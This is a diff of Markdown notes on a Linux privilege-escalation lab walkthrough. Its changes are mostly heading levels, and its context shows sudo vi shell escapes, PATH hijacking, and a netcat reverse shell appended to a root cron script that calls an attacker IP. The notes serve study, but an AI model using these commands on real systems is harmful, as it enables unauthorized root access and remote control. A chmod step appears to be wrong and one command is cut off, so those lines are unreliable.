@@ -2,10 +2,15 @@
 
 ## Table of Contents
 
+### Authentication Bypass  
+
 [Query The System](#query-the-system)  
 [Use LinEnum.sh to exfiltrate system information](#linenumsh-to-exfiltrate-the-system-information)  
 [use FIND to enumerate potential exploits](#use-find-to-identify-useful-file-properties-and-attributes)  
 [Identify Exploitable Commands](#identify-exploitable-commands)  
+[Exploit SUID/GUID](#suidguid)  
+[Misconfigured permissions on /etc/passwd](#writeable-etcpasswd-files)  
+
 
 
 
@@ -114,7 +119,7 @@ Reverse the server setup and transfer the enum.txt to the attacking device for a
 
 `:> sudo -l` list commands on which the current user may use sudo
 
-## Authentication Bypass  
+## Authentication Bypass Techniques
 
 ### SUID/GUID  
 
@@ -182,27 +187,27 @@ Switch to user7
 
 ![Complete](assets/Linux-PrivEsc-06-passwd-04.png)  
 
-## Escaping the Vi editor  
+### Escaping the Vi editor  
 
-### Identify vulnerable binaries
+#### Identify vulnerable binaries
 
 `:> sudo -l`
 
 ![exploitable bin](assets/Linux-PrivEsc-07-bins-01.png)
 
-### Start the vulnerable binary
+#### Start the vulnerable binary
 
 `:> sudo vi`
 
-### Use Vi command mode to open a shell with root privileges  
+#### Use Vi command mode to open a shell with root privileges  
 
 `:> !sh`
 
 ![exploited](assets/Linux-PrivEsc-07-bins-02.png)  
 
-## Exploit Crontab  
+### Exploit Crontab  
 
-### Identify cronjobs running with elevated privileges
+#### Identify cronjobs running with elevated privileges
 
 `:> cat /etc/crontab`  
 
@@ -218,33 +223,33 @@ Open the file
 
 ![open autoscript](assets/Linux-PrivEsc-08-cron-03.png)
 
-### Use Metasploit to generate a reverse shell and place into the autoscript.sh  
+#### Use Metasploit to generate a reverse shell and place into the autoscript.sh  
 
 `:> msfvenom -p cmd/unix/reverse_netcat lhost=<attacker IP> lport=8888 R`  
 
 mkfifo /tmp/yphto; nc 10.201.16.214 8888 0</tmp/yphto | /bin/sh >/tmp/yphto 2>&1; rm /tmp/  
 
-### Append the exploit to the autoscript.sh file
+#### Append the exploit to the autoscript.sh file
 
 `:> echo 'mkfifo /tmp/yphto; nc 10.201.16.214 8888 0</tmp/yphto | /bin/sh >/tmp/yphto 2>&1; rm /tmp/' >> /home/user4/Desktop/autoscript.sh`   
 
-### Start a netcat listener on the Attacking device  
+#### Start a netcat listener on the Attacking device  
 
 `:> nc -lvnp 8888`
 
-### Wait for the connection
+#### Wait for the connection
 
 ![shell received](assets/Linux-PrivEsc-08-cron-05.png)  
 
-## Exploiting the PATH variable
+### Exploiting the PATH variable
 
-### Show the current user's PATH 
+#### Show the current user's PATH  
 
 `:> echo $PATH`
 
 ![Echo Path](assets/Linux-PrivEsc-09-path-01.png)  
 
-### Build an imitation binary  
+#### Build an imitation binary  
 
 `:> echo '/bin/bash' > /tmp/ls`  
 `:> chmod -x /tmp/ls`  
@@ -253,7 +258,7 @@ When this binary is called, it will open a bash shell, not list the files in the
 
 ![Echo Path](assets/Linux-PrivEsc-09-path-02.png)  
 
-### Alter the PATH variable  
+#### Alter the PATH variable  
 
 `:> export PATH=/tmp:$PATH`  
 
@@ -263,7 +268,7 @@ When a users calls "ls" the system will see the "ls" in the tmp folder and execu
 
 ![tmp on Path](assets/Linux-PrivEsc-09-path-03.png)  
 
-### Run the script file  
+#### Run the script file  
 
 Observe the script binary has the SUID set. Any command called by the script runs with the owner's (root) privileges.  
 
